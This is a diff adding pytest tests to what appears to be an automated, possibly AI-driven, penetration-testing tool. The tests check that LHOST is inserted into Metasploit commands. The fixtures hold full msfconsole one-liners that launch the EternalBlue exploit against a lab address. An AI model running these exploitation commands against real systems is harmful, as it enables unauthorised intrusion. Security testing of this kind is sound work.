@@ -250,3 +250,110 @@ def test_modify_command_preserve_state(mock_modify, settings):
     assert result.failed_command_results == [failed_command_result]
     assert result.is_retry is True
     assert result.error_type == "TIMEOUT"
+
+
+def test_msfconsole_lhost_addition(settings):
+    """Test that LHOST is added to msfconsole commands with exploit/ modules."""
+    # Create a state with a msfconsole command using an exploit module without LHOST
+    state = GraphStateFactory(
+        query="Exploit EternalBlue",
+        context={
+            "target": {"rhost": "10.10.10.40"},
+            "attacker": {"lhost": "192.168.1.5"}
+        },
+        command_candidates=[
+            CommandInputFactory(
+                command="msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; run; exit -y\"",
+                timeout_sec=60
+            )
+        ]
+    )
+
+    # Act
+    result = command_modifier.modify_command(state, settings)
+
+    # Assert
+    assert len(result.command_candidates) == 1
+    assert "set LHOST 192.168.1.5" in result.command_candidates[0].command
+    # Check that LHOST is set after RHOSTS
+    command_parts = result.command_candidates[0].command.split(";")
+    rhosts_index = next((i for i, part in enumerate(command_parts) if "set RHOSTS" in part), -1)
+    lhost_index = next((i for i, part in enumerate(command_parts) if "set LHOST" in part), -1)
+    assert rhosts_index != -1 and lhost_index != -1
+    assert rhosts_index < lhost_index
+
+
+def test_msfconsole_with_existing_lhost(settings):
+    """Test that LHOST is not duplicated if it already exists in the command."""
+    # Create a state with a msfconsole command that already has LHOST set
+    state = GraphStateFactory(
+        query="Exploit with LHOST",
+        context={
+            "target": {"rhost": "10.10.10.40"},
+            "attacker": {"lhost": "192.168.1.5"}
+        },
+        command_candidates=[
+            CommandInputFactory(
+                command="msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 192.168.1.5; run; exit -y\"",
+                timeout_sec=60
+            )
+        ]
+    )
+
+    # Act
+    result = command_modifier.modify_command(state, settings)
+
+    # Assert
+    assert len(result.command_candidates) == 1
+    # Count occurrences of "set LHOST" - should be exactly one
+    assert result.command_candidates[0].command.count("set LHOST") == 1
+
+
+def test_msfconsole_non_exploit_module(settings):
+    """Test that LHOST is not added to msfconsole commands without exploit/ modules."""
+    # Create a state with a msfconsole command that doesn't use an exploit module
+    state = GraphStateFactory(
+        query="Use msfconsole for scanning",
+        context={
+            "target": {"rhost": "10.10.10.40"},
+            "attacker": {"lhost": "192.168.1.5"}
+        },
+        command_candidates=[
+            CommandInputFactory(
+                command="msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.40; run; exit -y\"",
+                timeout_sec=60
+            )
+        ]
+    )
+
+    # Act
+    result = command_modifier.modify_command(state, settings)
+
+    # Assert
+    assert len(result.command_candidates) == 1
+    assert "set LHOST" not in result.command_candidates[0].command
+
+
+def test_msfconsole_any_exploit_lhost_addition(settings):
+    """Test that LHOST is added to any msfconsole commands with 'use exploit/'."""
+    # Create a state with a msfconsole command using any exploit module without LHOST
+    state = GraphStateFactory(
+        query="Use any exploit module",
+        context={
+            "target": {"rhost": "10.10.10.40"},
+            "attacker": {"lhost": "192.168.1.5"}
+        },
+        command_candidates=[
+            CommandInputFactory(
+                command="msfconsole -q -x \"use exploit/some/new/module; set RHOSTS 10.10.10.40; run; exit -y\"",
+                timeout_sec=60
+            )
+        ]
+    )
+
+    # Act
+    result = command_modifier.modify_command(state, settings)
+
+    # Assert
+    assert len(result.command_candidates) == 1
+    assert "set LHOST 192.168.1.5" in result.command_candidates[0].command
